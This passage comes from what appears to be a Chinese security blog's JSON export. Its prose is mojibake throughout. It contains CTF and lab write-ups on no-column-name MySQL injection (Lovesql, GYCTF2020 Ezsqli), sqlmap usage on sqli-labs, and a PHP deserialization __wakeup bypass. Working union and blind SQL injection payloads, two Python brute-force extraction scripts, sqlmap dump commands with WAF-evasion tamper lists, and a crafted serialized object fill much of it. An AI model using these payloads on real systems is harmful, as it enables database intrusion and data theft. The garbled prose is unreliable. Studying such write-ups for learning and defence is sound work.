åˆ—åæ³¨å…¥ï¼Œå¹¶ä¸”å†™ä¸‹å¸ƒç½®çš„ä½œä¸šwpã€‚","text":"å‰è¨€å®è®­å®¤è®²äº†mysqlçš„è”åˆæŸ¥è¯¢æ³¨å…¥ä¸æ— åˆ—åæ³¨å…¥ï¼Œå› ä¸ºè”åˆæŸ¥è¯¢åšé¶åœºå°±å†™è¿‡äº†ï¼Œè¿™é‡Œå°±ä¸“é—¨è§£ææ— åˆ—åæ³¨å…¥ï¼Œå¹¶ä¸”å†™ä¸‹å¸ƒç½®çš„ä½œä¸šwpã€‚ æ— åˆ—åæ³¨å…¥ä»å®æˆ˜ä¸­å¼€å§‹è®²èµ·ã€‚ä»¥[æå®¢å¤§æŒ‘æˆ˜]Lovesqlä¸ºä¾‹ï¼Œè¿™é¢˜ç›´æ¥è”åˆæŸ¥è¯¢ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè·‘sqlmapä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä½†è¿™å°±å¾ˆæ²¡æ„æ€äº†ã€‚å› æ­¤æˆ‘ä»¬ç”¨æ— åˆ—åæ³¨å…¥æ¥è§£é¢˜(order byè·‘å‡ºæ¥æœ‰3åˆ—ï¼Œä¸”2,3åˆ—å¯æ˜¾)ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬è€ƒè™‘ä½¿ç”¨æ— åˆ—åæ³¨å…¥çš„æ¡ä»¶æ˜¯information_schemaè¿™ä¸ªæ•°æ®åº“è¢«è¿‡æ»¤äº†ï¼Œå¯¼è‡´æˆ‘ä»¬æ— æ³•ä½¿ç”¨è”åˆæ³¨å…¥ã€‚åœ¨é«˜ç‰ˆæœ¬çš„mysqlä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨mysql.innodb_table_statsæˆ–è€…sys.schema_auto_increment_columnsç­‰ç­‰æ¥è·å–è¡¨åï¼Œè¿™é‡Œæˆ‘ä»¬æ„é€ ç¬¬ä¸€å¥payloadï¼š 1111&#x27; union select 1,(select group_concat(table_name) from mysql.innodb_table_stats),3 # è·å–è¡¨åä¹‹åï¼Œç”±äºæ— æ³•è·å¾—å­—æ®µåï¼Œå› æ­¤æˆ‘ä»¬ç¼–å†™æ— åˆ—åæ³¨å…¥çš„payloadï¼š 1111&#x27; union select 1,2,(select `3` from (select 1,2,3 union select * from l0ve1ysq1)a)# æ¥åˆ†æä¸€ä¸‹è¿™æ®µpayloadï¼Œé¦–å…ˆæ•´ä½“ä¸Šè¿˜æ˜¯ä¸€ä¸ªè”åˆæŸ¥è¯¢è¯­å¥ï¼Œä½†æ˜¯åŒºåˆ«äºå¹³å¸¸çš„è”åˆæŸ¥è¯¢ï¼Œè¿™é‡ŒåŸæœ¬ç”¨æ¥æŸ¥è¯¢åˆ—åçš„è¯­å¥è¢«æ›¿æ¢æˆäº†ä¸ä½¿ç”¨åˆ—åè¿›è¡ŒæŸ¥è¯¢çš„æ— åˆ—åæ³¨å…¥è¯­å¥ã€‚æ— åˆ—åæ³¨å…¥çš„åŸç†ç®€å•æ¥è¯´å°±æ˜¯å°†æˆ‘ä»¬ä¸çŸ¥é“çš„åˆ—åå…ˆå–ä¸€ä¸ªåˆ«åï¼ŒåŒæ—¶è¿›è¡Œæ•°æ®æŸ¥è¯¢ã€‚ å…·ä½“çš„åŸç†è§£æå¯ä»¥å‚è€ƒè¿™æ¡é“¾æ¥çš„å†…å®¹ï¼šmysqlæ— åˆ—åæ³¨å…¥ è¿™æ ·æˆ‘ä»¬å°±ä¸éš¾çœ‹å‡ºï¼Œè¿™å¥payloadèµ·åˆ°çš„ä½œç”¨å°±æ˜¯å°†1,2,3ä¸‰ä¸ªæ•°å­—å¯¹åº”äº†æ•°æ®è¡¨ä¸­çš„1,2,3åˆ—ï¼Œå¹¶åŒæ—¶å¯¹ç¬¬ä¸‰åˆ—è¿›è¡ŒæŸ¥è¯¢ã€‚æœ€åä¸€ä¸ªå­—æ¯aç›¸å½“äºä¸€ä¸ªåå­—ï¼Œå¯ä»¥ä½¿ç”¨ä»»æ„å­—ç¬¦ä»£æ›¿ã€‚ åœ¨å®æˆ˜ä¸­ï¼Œåå¼•å·æ˜¯åŸºæœ¬ä¸Šä¸ä¼šæ”¾å‡ºæ¥çš„ï¼ˆå½“ç„¶è¿™é¢˜æ²¡æœ‰è¢«è¿‡æ»¤ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é‡‡ç”¨åˆ«åæ³•å¸¦å…¥çš„æ–¹å¼é¿å…payloadä¸­å‡ºç°åå¼•å·ï¼š 1111&#x27; union select 1,2,(select t from (select 1,2,3 as t union select * from l0ve1ysq1)a)# æˆ‘ä»¬å°†tè¿™ä¸ªåˆ«åèµ‹äºˆäº†3ï¼Œè¿™æ ·ä¸Šé¢çš„ä¸¤å¥payloadæ˜¯å®Œå…¨ç­‰ä»·çš„ã€‚åœ¨æ³¨å…¥è¿‡ç¨‹ä¸­å‘ç°è¿”å›å€¼è¶…è¿‡ä¸€è¡Œï¼Œä½¿ç”¨limitè¯­å¥ä¸€ä¸ªä¸ªæ³¨å…¥ï¼Œæœ€åå‘ç°ä¸‹é¢è¿™å¥payloadå¾—åˆ°äº†flagï¼š 1111&#x27; union select 1,2,(select `3` from (select 1,2,3 union select * from l0ve1ysq1 limit 16,1)a)# å…·ä½“å­¦ä¹ æ— åˆ—åæ³¨å…¥ï¼Œé™¤äº†ä¸Šé¢çš„é‚£ä¸ªé“¾æ¥å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡ä¸‹é¢è¿™ä¸ªé“¾æ¥è¿›è¡Œå…·ä½“å­¦ä¹ ï¼šBypass information_schemaä¸æ— åˆ—åæ³¨å…¥ [GYCTF2020]Ezsqli write upä¸€è¿›ç½‘é¡µå°±æ˜¯å­™ç¬‘å·çš„å¤§è„¸ï¼Œè¿˜æœ‰æ‡’å¾—åšå‰ç«¯çš„å¸ˆå‚…çš„ç–¯ç‹‚åæ§½ã€‚è¿™éƒ½ä¸é‡è¦ï¼Œé‡è¦çš„æ˜¯æœ€ä¸‹é¢çš„æ•°æ®æŸ¥è¯¢ï¼Œæˆ‘ä»¬å…ˆåˆ¤æ–­æ³¨å…¥æ–¹å¼ã€‚ä½†æ˜¯å½“æˆ‘è¾“å…¥è¿›1â€™è¿›å…¥æ—¶ï¼Œå®ƒå›æ˜¾äº†ä¸€ä¸ªbool(false)ï¼Œæˆ‘è§‰å¾—æœ‰ç‚¹ä¸å¯¹åŠ²ï¼Œé©¬ä¸Šæ‹¿å‡ºäº†å¼‚æˆ–æ³¨å…¥è¿›è¡Œæµ‹è¯•ï¼Œç»“æœæˆ‘å‘ç°æˆ‘è¢«å·è¢­äº†ã€‚ è¿™é¢˜è¿˜æ˜¯é“ç›²æ³¨é¢˜ï¼å½“æˆ‘æ³¨å…¥1^1^1æ—¶ï¼Œå›æ˜¾ä¸ºâ€œNu1Lâ€ï¼Œè€Œæ³¨å…¥1^0^1æ—¶ï¼Œå›æ˜¾çš„æ˜¯â€œError Occured When Fetch Result.â€ã€‚è€Œä¸”ç»è¿‡æµ‹è¯•ï¼Œorè¢«è¿‡æ»¤äº†ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦é‡‡ç”¨æ— åˆ—åæ³¨å…¥çš„æ–¹å¼è¿›è¡Œæ³¨å…¥ã€‚ å…ˆæµ‹è¯•äº†ä¸‹database()çš„é•¿åº¦åº”è¯¥æ˜¯21ï¼šå¥½å®¶ä¼™è¿™æ•°æ®åº“åè¿™ä¹ˆé•¿ï¼Œé‚£åªèƒ½è·‘è„šæœ¬äº†ï¼Œç”±äºè¿˜æ²¡æœ‰è„šæœ¬ç»éªŒï¼Œå› æ­¤å°±å¤§æ¦‚å†™ä¸‹payloadçš„æ„å»ºã€‚ é¦–å…ˆæ˜¯çˆ†è¡¨ï¼š 11^ascii(substr((select group_concat(table_name) from mysql.innodb_table_stats where table_schema=database()),1,1))=103^1 ç”±äºinformation_schemaè¢«è¿‡æ»¤ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨mysql.innodb_table_statsæ¥æŸ¥è¡¨åï¼Œè¿™å¥payloadå°±æ˜¯å¥å¾ˆå¹³å¸¸çš„å¸ƒå°”ç›²æ³¨ï¼Œè¡¨æ ¼çš„åç§°æ˜¯â€œf1ag_1s_h3r3_hhhhhâ€ã€‚ æ¥ç€è¦æŸ¥è¯¢æ•°æ®ï¼Œæˆ‘ä»¬æ„å»ºä¸€ä¸ªè¿™æ ·çš„payloadï¼š 11^((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh)).format(flag)^1 è¿™å¥payloadçš„åŸç†æ˜¯å°†å¤§äºå·å·¦å³ä¸¤è¾¹çš„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœå·¦è¾¹è¾ƒå¤§åˆ™è¿”å›1ï¼Œå¦åˆ™è¿”å›0ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ¤æ–­ã€‚è¦æ³¨æ„å­—æ®µæ•°ï¼Œå¦‚æœæŸ¥è¯¢å¤±è´¥åº”è¯¥æ›´æ”¹å·¦è¾¹çš„å­—æ®µæ•°å¹¶å†æ¬¡è¿›è¡Œæ³¨å…¥ã€‚ è¯¦ç»†åˆ†æä¸‹è¿™æ®µpayloadï¼Œå°±æ˜¯å°†f1ag_1s_h3r3_hhhhhè¡¨ä¸­çš„æ•°æ®å†…å®¹çš„asciiç å€¼ä¸â€œflagâ€çš„asciiå€¼ç›¸æ¯”ï¼ˆformatå°†å‰é¢çš„{}æ›¿æ¢æˆâ€flagâ€ï¼‰ï¼Œè¿™æ ·ä¸€æ­¥æ­¥å°±å¯ä»¥å°†flagè·‘å‡ºæ¥äº†ã€‚ å½“ç„¶ï¼Œç”±äºè¿™é‡Œç”¨çš„æ˜¯ï¼å·ï¼Œå› æ­¤è„šæœ¬ä¸­è¦å°†è¾“å‡ºçš„å­—ç¬¦å‡1ï¼Œå› ä¸ºåˆ¤æ–­æˆåŠŸæ—¶èŠ±æ‹¬å·å†…çš„å­—ç¬¦æ˜¯æ¯”å®é™…å†…å®¹å¤§1çš„ã€‚ æœ€åå·ä¸€ä¸ªå¤§ä½¬çš„è„šæœ¬å§ï¼š 1234567891011121314import requestsflag=&#x27;&#x27;url=&#x27;http://ca5cdac5-e97e-42df-9ed0-233bc75b4c4d.node3.buuoj.cn/index.php&#x27;for i in range(1,50): for j in range(33,127): payload = &quot;1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;&quot; data=&#123; &#x27;id&#x27;: payload &#125; r=requests.post(url,data=data) if &#x27;Nu1L&#x27; in r.text: flag=flag+chr(j) print(flag) break çˆ†è¡¨è„šæœ¬ 12345678910111213141516import requestsurl = &#x27;http://6c05130d-3668-41d6-9ad6-5e69ce00e0cc.node3.buuoj.cn/index.php&#x27;x=&#x27;&#x27;for j in range(1,50): for i in range(33,127): flag=x+chr(i) payload = &quot;1&amp;&amp;((1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;.format(flag) data=&#123; &#x27;id&#x27;:payload &#125; r = requests.post(url,data=data) if &#x27;Nu1L&#x27; in r.text: x=x+chr(i-1) print(x) break çˆ†æ•°æ®è„šæœ¬ æ€»ç»“sqlæ³¨å…¥åˆä¸€å—æ‹¼å›¾è¡¥ä¸Šäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç»§ç»­åˆ·é¢˜åˆ·é¶åœºçš„æ—¶é—´äº†ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"sqlmapä½¿ç”¨ç»ƒä¹ ","slug":"sqlmapä½¿ç”¨ç»ƒä¹ ","date":"2021-11-06T01:14:59.000Z","updated":"2021-12-01T08:28:26.224Z","comments":true,"path":"2021/11/06/sqlmapä½¿ç”¨ç»ƒä¹ /","link":"","permalink":"http://example.com/2021/11/06/sqlmap%E4%BD%BF%E7%94%A8%E7%BB%83%E4%B9%A0/","excerpt":"å‰è¨€æ‰‹åŠ¨è¿›è¡ŒSQLæ³¨å…¥æ•ˆç‡è¿˜æ˜¯æ²¡æœ‰å·¥å…·é«˜å•Šï¼ŒæŒæ¡å¯¹å·¥å…·çš„ä½¿ç”¨å¯ä»¥å¸®åŠ©æˆ‘ä»¬æé«˜æ•ˆç‡ã€‚å…ˆä»¥sqli-labsåŸºç¡€ç¯‡ä¸ºä¾‹å­¦ä¹ sqlmapåŸºç¡€åŠŸèƒ½ã€‚","text":"å‰è¨€æ‰‹åŠ¨è¿›è¡ŒSQLæ³¨å…¥æ•ˆç‡è¿˜æ˜¯æ²¡æœ‰å·¥å…·é«˜å•Šï¼ŒæŒæ¡å¯¹å·¥å…·çš„ä½¿ç”¨å¯ä»¥å¸®åŠ©æˆ‘ä»¬æé«˜æ•ˆç‡ã€‚å…ˆä»¥sqli-labsåŸºç¡€ç¯‡ä¸ºä¾‹å­¦ä¹ sqlmapåŸºç¡€åŠŸèƒ½ã€‚ GETå‹æ³¨å…¥è”åˆæŸ¥è¯¢less1-4æ³¨å…¥éƒ½æ˜¯å¾ˆç›¸ä¼¼çš„ï¼Œæˆ‘ä»¬å°±ä»¥ç¬¬ä¸€å…³ä¸ºä¾‹ã€‚æˆ‘ä»¬å¯ä»¥å…ˆæ£€æµ‹æ³¨å…¥æ–¹å¼ï¼špython sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-1/?id=1 --dbms --batch -uï¼šæŒ‡å®šurl â€“batch: æ‰§è¡Œè¿‡ç¨‹ä¸­ä¸éœ€è¦ç”¨æˆ·è¾“å…¥YES or NOï¼Œå°†ä¼šä½¿ç”¨sqlmapæç¤ºçš„é»˜è®¤å€¼YESä¸€ç›´è¿è¡Œä¸‹å»ã€‚æ¨èéƒ½å¯ä»¥æ·»åŠ è¿› â€“dbmsï¼šæŒ‡å®šæ•°æ®åº“ ç»“æœå¦‚ä¸‹ï¼šç³»ç»Ÿç»™å‡ºäº†å››ç§æ³¨å…¥æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯å¸ƒå°”ç›²æ³¨ã€æŠ¥é”™æ³¨å…¥ã€æ—¶é—´ç›²æ³¨å’Œè”åˆæŸ¥è¯¢ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»payloadçœ‹å‡ºè¿™é¢˜æ˜¯åŸºäºå•å¼•å·çš„é”™è¯¯è¿›è¡Œæ³¨å…¥ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹è¿›è¡Œæ³¨å…¥ï¼Œä¸‹é¢ä»‹ç»å¦‚ä½•ä¸€æ­¥æ­¥ä»æ•°æ®åº“æŸ¥åˆ°è¡¨æ ¼ä¸­çš„æ•°æ®ï¼š â€“dbsï¼šçˆ†å‡ºæ‰€æœ‰æ•°æ®åº“åç§° â€“current-dbï¼šè·å–å½“å‰æ•°æ®åº“åç§° -D database_name â€“tablesï¼šè·å–æŒ‡å®šæ•°æ®åº“ä¸­çš„è¡¨å -D database_name -T table_name â€“columnsï¼šè·å–æŒ‡å®šè¡¨æ ¼çš„åˆ—å -D database_name -T table_name -C cname1[,cname2,cname3â€¦] â€“dumpï¼šè·å–æŒ‡å®šåˆ—çš„æ•°æ® ç»“æœå¦‚ä¸‹ï¼špython sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-1/?id=1 --dbs python sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-1/?id=1 -D security --tables python sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-1/?id=1 -D security -T users --columns python sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-1/?id=1 -D security -T users -C id,username,password --dump æŠ¥é”™æ³¨å…¥&amp;ç›²æ³¨å…¶å®ç›´æ¥ç”¨ä¸Šé¢çš„è¯­å¥ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯è¿™æ—¶æˆ‘ä»¬ä¼šå‘ç°ï¼Œsqlmapçš„æ³¨å…¥ç”¨æ—¶å¤§å¤§å»¶é•¿ï¼Œè¿™æ˜¯å› ä¸ºsqlmapæ£€æµ‹åˆ°äº†å¤šç§æ³¨å…¥æ–¹æ³•ï¼Œç„¶åä¸€ä¸ªä¸€ä¸ªè·‘ä¸‹æ¥ï¼Œç­‰åˆ°æˆåŠŸäº†å†è¿”å›ç»“æœï¼Œå› æ­¤ä»‹ç»å¦‚ä½•æŒ‡å®šè¿‡æ»¤æ–¹æ³•ï¼š â€“technique Xï¼šæŒ‡å®šæ³¨å…¥æŠ€æœ¯ï¼Œæ”¯æŒ5ç§å½¢å¼ï¼Œæ ¹æ®ä¸åŒæ–¹æ³•æŒ‡å®šXçš„å€¼ï¼ˆæŒ‡å®šå¤šä¸ªä¹Ÿå¯ä»¥ï¼Œä¾‹å¦‚è¦æŒ‡å®šæŠ¥é”™å’Œæ—¶é—´ç›²æ³¨å°±æ˜¯ETï¼‰ 12345B:Boolean-based-blind ï¼ˆå¸ƒå°”å‹å‹æ³¨å…¥ï¼‰E:Error-based ï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰U:Union query-based ï¼ˆè”åˆæ³¨å…¥ï¼‰S:Starked queries ï¼ˆé€šè¿‡sqlmapè¯»å–æ–‡ä»¶ç³»ç»Ÿã€æ“ä½œç³»ç»Ÿã€æ³¨å†Œè¡¨å¿…é¡» ä½¿ç”¨è¯¥å‚æ•°ï¼Œå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰T:Time-based blind ï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼Œé»˜è®¤5ç§’ï¼‰ ç›²æ³¨æ—¶ï¼Œä¸ºäº†æé«˜æ•ˆç‡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è®¾ç½®æœ€å¤§å¹¶å‘çº¿ç¨‹ï¼š â€“threadsï¼šæœ€å¤§å¹¶å‘çº¿ç¨‹ï¼Œç›²æ³¨æ—¶æ¯ä¸ªçº¿ç¨‹è·å–ä¸€ä¸ªå­—ç¬¦ï¼Œè·å–å®Œæˆåçº¿ç¨‹ç»“æŸï¼Œé»˜è®¤ä¸º1ï¼Œå»ºè®®ä¸è¦è¶…è¿‡10 è¿™æ ·å¯ä»¥å¤§å¤§æé«˜æ³¨å…¥æ•ˆç‡ã€‚ POSTå‹æ³¨å…¥é’ˆå¯¹POSTå‹æ³¨å…¥æœ‰ä¸¤ç§æ–¹å¼ã€‚ â€“dataï¼šæ·»åŠ æ•°æ®æ®µ ä¾‹å¦‚ï¼špython sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-11 --data &quot;uname=1 &amp;passwd=1 &amp;submit=Submit&quot; --dbs å½“ç„¶æˆ‘ä»¬ä¸€èˆ¬ä¸è¿™æ ·åšï¼Œå› ä¸ºè¿™æ ·æ„é€ æ¯”è¾ƒéº»çƒ¦ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨burp suitæŠ“åŒ…åå°†å†…å®¹å­˜åœ¨txtæ–‡æ¡£ä¸­ï¼Œè¿™ä¸ªæ–‡æ¡£ä¹Ÿä¸€èˆ¬æ”¾åœ¨sqlmapçš„æ ¹ç›®å½•ä¸­ï¼Œç„¶åæ„å»ºä¸‹é¢è¿™ä¸ªæŒ‡ä»¤ï¼ˆæ–‡ä»¶å­˜å…¥1.txtä¸­ï¼‰ï¼špython sqlmap.py -r 1.txt --dbs ä¸ºä»€ä¹ˆæ¨èä¸‹é¢è¿™ç§åšæ³•å‘¢ï¼Œä¸€ä¸ªæ˜¯å› ä¸ºè¿™æ ·æ„é€ çš„æŒ‡ä»¤æ¯”è¾ƒç®€å•ï¼Œå¦ä¸€ä¸ªæ˜¯å› ä¸ºè¿™æ ·å½“æˆ‘ä»¬è®¾ç½®é«˜levelæ—¶å°±ä¼šæ£€æµ‹æ–‡ä»¶å¤´ä¸­çš„å…¶ä»–å‚æ•°ï¼Œä¸‹é¢ä»‹ç»sqlmapçš„å‡ ä¸ªç­‰çº§ï¼š â€“level 1ï¼šé»˜è®¤å€¼ï¼Œèƒ½æµ‹è¯•çš„è¯­å¥å°‘ï¼Œé€Ÿåº¦å¿« â€“level 2ï¼šæµ‹è¯•httpã€cookie â€“level 3ï¼šæµ‹è¯•user-agentã€referer å½“levelä¸º5æ—¶ä¼šæµ‹è¯•å¾ˆå¤šçš„payloadï¼Œæ•ˆç‡ä¼šé™ä½ã€‚å½“ä¸æ¸…æ¥šæ³¨å…¥ç‚¹æ—¶å¯ä»¥å°†levelçš„å€¼è®¾ç½®ä¸º3æˆ–ä»¥ä¸Šã€‚ å½“ç„¶å½“æ¸…æ¥šæ³¨å…¥ç‚¹æ—¶ï¼Œä¹Ÿå¯ä»¥ç”¨ä¾‹å¦‚--cokkieã€--user-agentè¿™ç±»çš„è¯­å¥æŒ‡å®šæ³¨å…¥ç›®æ ‡ï¼Œè¿™æ ·å¯ä»¥ä¸ç”¨æŠ“åŒ…ï¼Œä¹Ÿå¯ä»¥ä¸ç”¨è®¾ç½®levelï¼špython sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-19/ --referer=&quot; http://127.0.0.1/sqli-labs-php7/Less-19/*&quot; --dbs Tamperæ³¨å…¥æ—¶é‡åˆ°è¿‡æ»¤ä¸€å®šæ˜¯ä¸å¯é¿å…çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨sqlmapè‡ªå¸¦çš„tamperè„šæœ¬è¿›è¡Œå„ç§çš„ç»•è¿‡ã€‚ ä¾‹å¦‚21å…³ä¸­å¯¹cookieéœ€è¦è¿›è¡Œbase64è§£ç ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨--tamper=base64encodeæ¥è§£å†³ ä¸è¿‡åœ¨æˆ‘ä»¬ä¸å¤ªæ¸…æ¥šå…·ä½“è¿‡æ»¤çš„å†…å®¹æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ— è„‘å¥—tamperï¼Œè™½ç„¶æ•ˆç‡åä½ï¼Œä½†æ˜¯ååˆ†æ–¹ä¾¿ï¼štamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotestamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor æ€»ç»“sqlmapè¿˜æœ‰å¾ˆå¤šå¾ˆå¼ºå¤§çš„åŠŸèƒ½ï¼Œä¸‹é¢çš„é“¾æ¥æ€»ç»“äº†sqlmapçš„æ‰€æœ‰æŒ‡ä»¤å¯ä¾›å‚è€ƒã€‚sqlmapæŒ‡ä»¤å¤§å…¨","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"phpååºåˆ—åŒ–æ¼æ´åº”ç”¨","slug":"phpååºåˆ—åŒ–æ¼æ´åº”ç”¨","date":"2021-11-01T10:07:52.000Z","updated":"2021-11-29T13:50:16.402Z","comments":true,"path":"2021/11/01/phpååºåˆ—åŒ–æ¼æ´åº”ç”¨/","link":"","permalink":"http://example.com/2021/11/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%BA%94%E7%94%A8/","excerpt":"å‰è¨€åŒæ ·æ˜¯buuï¼ŒåŒæ ·æ˜¯æå®¢å¤§æŒ‘æˆ˜ï¼Œè¿™æ¬¡é‡åˆ°äº†ä¸€é¢˜æœ‰å…³äºphpååºåˆ—åŒ–æ¼æ´ï¼Œé‡åˆ°æ–°ä¸œè¥¿æ€»æ˜¯è¦å¼€åšå®¢è®°å½•çš„å˜›ã€‚","text":"å‰è¨€åŒæ ·æ˜¯buuï¼ŒåŒæ ·æ˜¯æå®¢å¤§æŒ‘æˆ˜ï¼Œè¿™æ¬¡é‡åˆ°äº†ä¸€é¢˜æœ‰å…³äºphpååºåˆ—åŒ–æ¼æ´ï¼Œé‡åˆ°æ–°ä¸œè¥¿æ€»æ˜¯è¦å¼€åšå®¢è®°å½•çš„å˜›ã€‚ [æå®¢å¤§æŒ‘æˆ˜ 2019]PHPè¿›å…¥ç½‘é¡µï¼Œæˆ‘ä»¬å‘ç°ä¸€åªçŒ«åœ¨ç½‘é¡µä¸­å¿ƒï¼Œæˆ‘ä»¬é¼ æ ‡æ§åˆ¶ç€ä¸€å›¢æ¯›çº¿ï¼Œè¯¶è¿˜æŒºå¥½ç©çš„ã€‚å’³å’³ï¼Œè¿›å…¥æ­£é¢˜ï¼Œæˆ‘ä»¬æŠ“ä½é¢˜ç›®ç»™æˆ‘ä»¬çš„æç¤ºâ€”â€”å¤‡ä»½ç½‘ç«™ã€‚ä¸€èˆ¬å¤‡ä»½ç½‘ç«™çš„å¤‡ä»½æ–‡ä»¶æ˜¯åœ¨www.zipä¸­ï¼Œå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨dirsearchæ¥è¿›è¡Œæ‰«æï¼Œå‘ç°www.zipçš„çŠ¶æ€ä¸º200ï¼š æ¥ç€æˆ‘ä»¬æ‰“å¼€å¤‡ä»½æ–‡ä»¶ï¼Œå‘ç°ä¸€ä¸ªflag.phpæ–‡ä»¶ï¼Œä½†æ˜¯æ˜¾ç„¶æˆ‘ä»¬èƒ½ç›´æ¥é˜…è¯»åˆ°çš„å¹¶ä¸æ˜¯çœŸæ­£çš„flagã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥é˜…è¯»index.phpä»£ç ï¼š 12345&lt;?phpinclude &#x27;class.php&#x27;;$select = $_GET[&#x27;select&#x27;];$res=unserialize(@$select);?&gt; æˆ‘ä»¬æ³¨æ„åˆ°äº†è¿™ä¸€è¡Œï¼Œå˜é‡selectä»¥GETæ–¹å¼è¾“å…¥ï¼Œå¹¶è¿›è¡Œååºåˆ—åŒ–ï¼Œè€Œä¸”åŒ…å«äº†æ–‡ä»¶class.phpï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‰“å¼€class.phpä¸€æ¢ç©¶ç«Ÿï¼š 123456789101112131415161718192021222324252627282930313233class Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125;&#125; è¿™é‡Œä»£ç åˆ›å»ºäº†ä¸€ä¸ªç»“æ„ä½“Nameï¼Œè®¾ç½®å…¶ä¸­çš„usernameä¸passwordã€‚é‚£ä¹ˆæˆ‘ä»¬å‘ç°ï¼Œåªè¦è®¾ç½®username=admin&amp;password=100ï¼Œé‚£ä¹ˆå†æ¬¡æ‰§è¡Œ_destructå°±å¯ä»¥å›æ˜¾flagäº†ã€‚ ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œwakeupä¼šå¯¼è‡´usernameè¢«èµ‹å€¼æˆguestï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ”¹å˜åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å¯¹è±¡çš„ä¸ªæ•°æ¥ç»•è¿‡ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸‹é¢è¿™ä¸ªç¨‹åºç”ŸæˆURLï¼š 123456789&lt;?phpclass Name&#123; private $username = &#x27;admin&#x27;; private $password = &#x27;100&#x27;;&#125;$a = new Name();echo urlencode(serialize($a));?&gt; ä½¿ç”¨URLç¼–ç ä¿è¯ä¸å¯æ‰“å°å­—ç¬¦å¤åˆ¶æ—¶ä¸ä¼šä¸¢å¤±ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥ä¸ç¼–ç ï¼‰ï¼Œç¼–ç ä¸ä¸ç¼–ç çš„ç»“æœåˆ†åˆ«å¦‚ä¸‹ï¼š 12O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7DO:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125; 